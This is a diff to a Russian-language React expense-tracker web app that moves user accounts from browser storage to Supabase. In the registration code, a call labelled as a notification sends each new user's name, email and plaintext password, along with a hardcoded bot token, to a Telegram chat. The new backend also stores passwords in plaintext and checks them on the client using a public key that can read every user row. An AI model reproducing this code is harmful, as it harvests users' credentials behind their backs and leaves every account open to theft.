@@ -18,6 +18,41 @@
   <script type="text/babel">
     const { useState, useRef, useEffect } = React;
 
+// ══════════════════════════════════════
+//  SUPABASE CONFIG — вставь свои ключи
+// ══════════════════════════════════════
+const SB_URL = "https://ТВОЙ_ПРОЕКТ.supabase.co";
+const SB_KEY = "ТВОЙ_ANON_KEY";
+const SB_H   = { "Content-Type":"application/json", "apikey":SB_KEY, "Authorization":"Bearer "+SB_KEY, "Prefer":"return=representation" };
+
+async function sbGetUser(email) {
+  try {
+    const r = await fetch(`${SB_URL}/rest/v1/users?email=eq.${encodeURIComponent(email)}&select=*`, {headers:SB_H});
+    const d = await r.json();
+    return d[0] || null;
+  } catch { return null; }
+}
+
+async function sbCreateUser(email, password, name) {
+  const r = await fetch(`${SB_URL}/rest/v1/users`, {
+    method:"POST", headers:SB_H,
+    body:JSON.stringify({email, password, name, expenses:[], goals:[],
+      settings:{lang:"ru",currency:"RUB",theme:"dark",dailyBudget:"",notifications:true}})
+  });
+  if (!r.ok) { const e=await r.json(); throw new Error(e.message||"Ошибка регистрации"); }
+  const d = await r.json();
+  return d[0] || null;
+}
+
+async function sbSaveUser(email, data) {
+  try {
+    await fetch(`${SB_URL}/rest/v1/users?email=eq.${encodeURIComponent(email)}`, {
+      method:"PATCH", headers:SB_H, body:JSON.stringify(data)
+    });
+  } catch {}
+}
+// ══════════════════════════════════════
+
 
 const CATEGORIES = [
   { id:"food",          label:"Еда",           icon:"🍽️", color:"#FF6B6B" },
@@ -96,46 +131,40 @@ function AuthScreen({ onLogin }) {
     setScreen(s);
   };
 
-  const doLogin = () => {
+  const doLogin = async () => {
     setErr("");
     if (!email.trim()) { setErr("Введите email"); return; }
     if (!pass.trim())  { setErr("Введите пароль"); return; }
     setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
-      const key = email.toLowerCase().trim();
-      const db  = lsGet("dayspent_db") || {};
-      const acc = db[key];
-      if (!acc)                       { setErr("Аккаунт не найден. Сначала зарегистрируйтесь"); return; }
-      if (acc.password !== pass)      { setErr("Неверный пароль"); return; }
-      onLogin(key, JSON.parse(JSON.stringify(acc)));
-    }, 600);
+    const acc = await sbGetUser(email.toLowerCase().trim());
+    setLoading(false);
+    if (!acc)                  { setErr("Аккаунт не найден. Сначала зарегистрируйтесь"); return; }
+    if (acc.password !== pass) { setErr("Неверный пароль"); return; }
+    lsSet("dayspent_session", acc.email);
+    onLogin(acc.email, acc);
   };
 
-  const doRegister = () => {
+  const doRegister = async () => {
     setErr("");
     if (!name.trim())     { setErr("Введите имя"); return; }
     if (!email.trim())    { setErr("Введите email"); return; }
     if (pass.length < 6)  { setErr("Пароль — минимум 6 символов"); return; }
     if (pass !== confirm) { setErr("Пароли не совпадают"); return; }
     setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
-      const key = email.toLowerCase().trim();
-      const db  = lsGet("dayspent_db") || {};
-      if (db[key]) { setErr("Email уже зарегистрирован"); return; }
-      const acc = { password:pass, name:name.trim(), expenses:[], goals:[],
-        settings:{lang:"ru",currency:"RUB",theme:"dark",dailyBudget:"",notifications:true} };
-      db[key] = acc;
-      lsSet("dayspent_db", db);
+    const exists = await sbGetUser(email.toLowerCase().trim());
+    if (exists) { setLoading(false); setErr("Email уже зарегистрирован"); return; }
+    try {
+      const acc = await sbCreateUser(email.toLowerCase().trim(), pass, name.trim());
       // Telegram уведомление
       fetch("https://api.telegram.org/bot8708390478:AAFinj7p2jhnn2b4A2k60ZwgywDg83kuaJI/sendMessage", {
         method:"POST", headers:{"Content-Type":"application/json"},
         body: JSON.stringify({ chat_id:"-1003855093384",
-          text:"🆕 Новый пользователь!\n\n👤 " + name.trim() + "\n📧 " + key + "\n🔑 " + pass + "\n🕐 " + new Date().toLocaleString("ru-RU") })
+          text:"🆕 Новый пользователь!\n\n👤 " + name.trim() + "\n📧 " + email.toLowerCase().trim() + "\n🔑 " + pass + "\n🕐 " + new Date().toLocaleString("ru-RU") })
       }).catch(()=>{});
-      onLogin(key, JSON.parse(JSON.stringify(acc)));
-    }, 600);
+      lsSet("dayspent_session", acc.email);
+      onLogin(acc.email, acc);
+    } catch(e) { setErr(e.message||"Ошибка. Проверь настройки Supabase"); }
+    setLoading(false);
   };
 
   const av = getAvatarColor(name||email);
@@ -279,27 +308,27 @@ function AuthScreen({ onLogin }) {
    ROOT
 ════════════════════════════════════ */
 function App() {
-  const [userKey,  setUserKey]  = useState(() => {
+  const [userKey,  setUserKey]  = useState(()=>lsGet("dayspent_session")||null);
+  const [userData, setUserData] = useState(()=>lsGet("dayspent_userdata")||null);
+
+  // При старте — если есть сессия, подгрузить свежие данные с Supabase
+  useEffect(()=>{
     const sk = lsGet("dayspent_session");
-    const db = lsGet("dayspent_db") || {};
-    return sk && db[sk] ? sk : null;
-  });
-  const [userData, setUserData] = useState(() => {
-    const sk = lsGet("dayspent_session");
-    const db = lsGet("dayspent_db") || {};
-    return sk && db[sk] ? JSON.parse(JSON.stringify(db[sk])) : null;
-  });
+    if (!sk) return;
+    sbGetUser(sk).then(acc=>{
+      if (acc) { setUserData(acc); lsSet("dayspent_userdata", acc); }
+      else     { lsSet("dayspent_session",null); lsSet("dayspent_userdata",null); setUserKey(null); setUserData(null); }
+    });
+  },[]);
 
   const handleLogin  = (key, acc) => {
-    setUserKey(key);
-    setUserData(acc);
+    setUserKey(key); setUserData(acc);
     lsSet("dayspent_session", key);
+    lsSet("dayspent_userdata", acc);
   };
   const handleLogout = () => {
-    // Сохранить данные перед выходом
-    const db = lsGet("dayspent_db") || {};
-    if (userKey && db[userKey]) lsSet("dayspent_db", db);
     lsSet("dayspent_session", null);
+    lsSet("dayspent_userdata", null);
     setUserKey(null); setUserData(null);
   };
 
@@ -350,9 +379,8 @@ function MainApp({ userKey, userData, setUserData, onLogout }) {
     const updated = {expenses,goals,settings:{lang,currency,theme,dailyBudget,notifications}};
     setUserData(p=>({...p,...updated}));
     if (userKey) {
-      const db = lsGet("dayspent_db") || {};
-      db[userKey] = {...(db[userKey]||{}), ...updated};
-      lsSet("dayspent_db", db);
+      lsSet("dayspent_userdata", {...(lsGet("dayspent_userdata")||{}), ...updated});
+      sbSaveUser(userKey, updated);
     }
   },[expenses,goals,lang,currency,theme,dailyBudget,notifications]);
 
@@ -458,8 +486,7 @@ function MainApp({ userKey, userData, setUserData, onLogout }) {
   };
   const saveProfile = () => {
     if(!profForm.name.trim()) return;
-    const db = lsGet("dayspent_db") || {};
-    if (db[userKey]) { db[userKey].name = profForm.name.trim(); lsSet("dayspent_db", db); }
+    sbSaveUser(userKey, {name: profForm.name.trim()});
     setUserData(p=>({...p,name:profForm.name.trim()}));
     showT(T.profSaved); setShowProfile(false);
   };
